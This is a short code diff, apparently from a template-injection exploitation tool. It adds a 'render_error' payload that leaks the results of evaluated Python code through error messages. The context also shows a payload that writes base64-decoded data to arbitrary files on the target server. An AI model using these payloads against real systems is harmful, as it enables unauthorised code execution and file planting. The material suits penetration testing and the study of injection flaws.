@@ -24,6 +24,13 @@ class Python(Plugin):
                 'test_render': f"""str('{rand.randstrings[0]}'.join('{rand.randstrings[1]}'))""",
                 'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
             },
+            'render_error': {
+                'render': """{code}""",
+                'header': """getattr("", str({header[0]}+{header[1]})+str(""",
+                'trailer': """).rstrip()+str({trailer[0]}+{trailer[1]}))""",
+                'test_render': f"""str('{rand.randstrings[0]}'.join('{rand.randstrings[1]}'))""",
+                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
+            },
             'write': {
                 'call': 'evaluate',
                 'write': """open("{path}", 'ab+').write(__import__("base64").urlsafe_b64decode('{chunk_b64}'))""",
